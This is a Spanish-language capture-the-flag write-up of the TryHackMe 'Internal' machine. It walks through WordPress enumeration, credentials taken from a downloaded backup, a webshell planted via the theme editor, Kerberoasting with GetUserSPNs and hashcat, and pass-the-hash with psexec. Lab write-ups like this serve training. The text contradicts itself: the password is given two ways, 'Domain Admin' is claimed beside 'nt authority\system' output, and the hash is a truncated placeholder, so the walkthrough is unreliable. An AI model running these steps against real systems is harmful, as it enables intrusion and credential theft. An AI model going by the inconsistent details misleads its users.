# 🖥️ THM: Internal

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Internal |
| **Plataforma** | TryHackMe |
| **Dificultad** | Medium |
| **Categoría** | AD / Kerberoasting |
| **IP** | 10.10.x.x |
| **OS** | Windows Server 2016 |
| **Fecha** | 2024 |
| **Tiempo** | 120 min |

---

## 🎯 Resumen Ejecutivo

> Encontré **WordPress** con credenciales en un backup, obtuve acceso al dominio, ejecuté **Kerberoasting** para obtener hashes de servicios, y escalé a Domain Admin via **Pass-the-Hash**.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_internal.txt 10.10.x.x
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 22 | SSH | OpenSSH | Open |
| 80 | HTTP | Apache 2.4.18 | Open |
| 88 | Kerberos | Microsoft Windows Kerberos | Open |
| 139 | SMB | Microsoft Windows | Open |
| 445 | SMB | Microsoft Windows | Open |
| 389 | LDAP | Microsoft Windows LDAP | Open |

### Web Enumeration

```bash
# WordPress detectado
wpscan --url http://10.10.x.x

# Backup found
curl http://10.10.x.x/wordpress.zip
```

**Resultado:** Backup contiene credenciales en `wp-config.php`:
```
DB_USER: admin
DB_PASSWORD: TgyKan&@v4Yf
```

---

## 💥 Explotación

### WordPress Admin Access

```bash
# Login con credenciales de DB (reutilizadas)
# User: admin
# Pass: TgyKan&@v4f

# Subir webshell via Template Editor
# Appearance > Editor > 404.php
```

---

## 🚀 Escalada de Privilegios

### Kerberoasting

```bash
# Enumerar usuarios SPN
GetUserSPNs.py corp.local/admin:TgyKan&@v4f -dc-ip 10.10.x.x -request

# Crackear hash
hashcat -m 13100 hash.txt rockyou.txt
```

**Resultado:** Hash de servicio crackeado.

### Pass-the-Hash

```bash
# Usar hash NTLM
psexec.py -hashes aad3b435b51404ee:HASH admin@10.10.x.x

# Domain Admin obtenido
C:\> whoami
nt authority\system
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `C:\Users\Jeff\Desktop\user.txt` |
| **Root** | `FLAG{...}` | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- Backups de WordPress contienen credenciales
- Credenciales reutilizadas entre servicios
- Kerberoasting es efectivo en AD

### 🔄 Qué haría diferente
- Buscar backups inmediatamente
- Verificar si hay más usuarios con SPN

---

*Writeup creado para CDPN — Nivel Medio*
